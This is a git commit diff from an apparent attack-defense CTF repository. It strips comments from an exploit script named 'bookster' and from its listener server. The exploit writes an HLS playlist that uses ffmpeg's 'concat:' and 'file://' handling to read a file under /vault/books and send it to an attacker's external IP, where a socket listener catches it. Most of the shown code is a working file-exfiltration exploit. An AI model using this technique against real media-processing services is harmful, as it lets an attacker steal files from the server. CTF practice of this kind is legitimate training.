528abb4a3bc3a3f4f04c97364de7413300c547cb
NitroLiine <sergey.and.natsha@yandex.ru>
2023-04-22 07:53:54 +0500

    [bookster] remove comments from sploit file

--- sploits/bookster/bookster.1.sploit.py
+++ sploits/bookster/bookster.1.sploit.py
@@ -5,14 +5,14 @@ import time
 from subprocess import Popen, PIPE, STDOUT
 
 from send_payload import send_payload
-from server import listen_flag
 
-print("Need external ip address to sploit this")
+
 EXTERNAL_IP = sys.argv[1]
 FLAG_ID = sys.argv[2]
 HOST = sys.argv[3]
 TOKEN = sys.argv[4]
 PORT = 8900
+
 
 def setup_static():
     header_data = f"""#EXTM3U
@@ -35,18 +35,13 @@ concat:http://{EXTERNAL_IP}:12322/hdr.m3u8|file:///vault/books/{FLAG_ID}.txt
 
 
 if __name__ == '__main__':
-    #f = open("log.log", "w")
     setup_static()
     gen_payload()
-    # listen_flag_thread = listen_flag()
     p = Popen(['python3', 'server.py'], stdout=PIPE, stderr=STDOUT)
-    #output = Popen(['python3', 'server.py'], stdout=f, stderr=f)
     time.sleep(2)
     send_payload(HOST, PORT, TOKEN)
     time.sleep(2)
     for line in iter(p.stdout.readline, ''):
         print(line)
         sys.stdout.flush()
-    #listen_flag_thread.start()
-    #response = output.communicate()
-    #print(response)
+
--- sploits/bookster/server.py
+++ sploits/bookster/server.py
@@ -2,14 +2,12 @@ import socket
 import sys
 import threading
 
-# Define server settings
-
 
 def listen_flag(host='0.0.0.0', port=12345):
+
     def handle_client(client_socket, client_addr):
         print(f"Connected to {client_addr}")
         sys.stdout.flush()
-        # Continuously receive data from the client and echo it back
         while True:
             data = client_socket.recv(1024)
             if not data:
@@ -18,21 +16,16 @@ def listen_flag(host='0.0.0.0', port=12345):
             sys.stdout.flush()
             client_socket.sendall(data)
 
-        # Close the client socket
         client_socket.close()
         print(f"Connection closed: {client_addr}")
         sys.stdout.flush()
 
-    # Create the socket
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Allow the socket to be reused after the process is terminated
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    # Bind the socket to the specified host and port
     server_socket.bind((host, port))
 
-    # Start listening for incoming connections
     server_socket.listen(5)
 
     print(f"Listening on {host}:{port}")
@@ -43,7 +36,6 @@ def listen_flag(host='0.0.0.0', port=12345):
     return client_thread
 
 
-# Continuously accept incoming connections and spawn a new thread for each one
 if __name__ == '__main__':
     while True:
         client_thread = listen_flag()
